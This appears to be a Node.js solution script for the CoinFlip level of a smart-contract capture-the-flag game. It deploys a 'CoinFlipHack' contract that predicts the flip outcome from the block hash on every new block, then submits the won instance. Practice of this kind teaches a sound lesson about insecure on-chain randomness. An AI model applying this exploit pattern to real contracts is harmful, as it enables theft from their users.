const {
  web3
} = require('../utils/getWeb3');
const {
  mainAddress,
  levelAddresses,
  deployId,
  submitId
} = require('../utils/contractInfo');
const {
  getAccounts,
  checkLength,
  sendTransaction,
  valueFromLogs
} = require('../utils/helpers');
const {
  deployContract
} = require('../utils/deployContract');

var globalValue = {
  count: 0
};

const createInstance = async () => {
  console.log('Creating instance...');
  const account = await getAccounts(0);
  globalValue.account = account;
  const levelAddress = levelAddresses[3];
  console.log("deploying....");
  const payload = deployId + '0'.repeat(24) + levelAddress.slice(2);
  checkLength(payload, 74);
  return sendTransaction(payload, mainAddress, account);
};

const initHack = async (data) => {
  let currentBlock = await data.methods.getBlockMinusOne().call();
  if (currentBlock != globalValue.prevBlock) {
    console.log(`New Block detected: ${currentBlock}, initiating flip_${globalValue.count}.`);
    globalValue.prevBlock = currentBlock;
    globalValue.count++;
    return data.methods.checkBlock().send({
      from: globalValue.account,
      gas: 3000000
    });
  }
};

const submitInstance = async (instanceAddress) => {
  console.log('Submitting instance...');
  const payload = submitId + '0'.repeat(24) + instanceAddress.slice(2);
  checkLength(payload, 74);
  const account = await getAccounts(0);
  return sendTransaction(payload, mainAddress, globalValue.account);
};

createInstance()
  .then((receipt) => {
    const rawAddress = valueFromLogs(receipt, 'data');
    const instanceAddress = '0x' + rawAddress.slice(26);
    globalValue.instanceAddress = instanceAddress;
    return deployContract(
      globalValue.account,
      __dirname,
      'CoinFlipHack',
      '.sol',
      [instanceAddress],
      web3.utils.toWei('0.001'));
  })
  .then((data) => {
    const flip = setInterval(async () => {
      if (globalValue.count >= 12) {
        const totalResult = await data.methods.getWins().call();
        console.log('totalResult', totalResult);
        if (totalResult >= 10) {
          clearInterval(flip);
          return submitInstance(globalValue.instanceAddress);
        }
      }
      initHack(data);
    }, 3000);
  })
  .then(console.log)
  .catch(console.log);
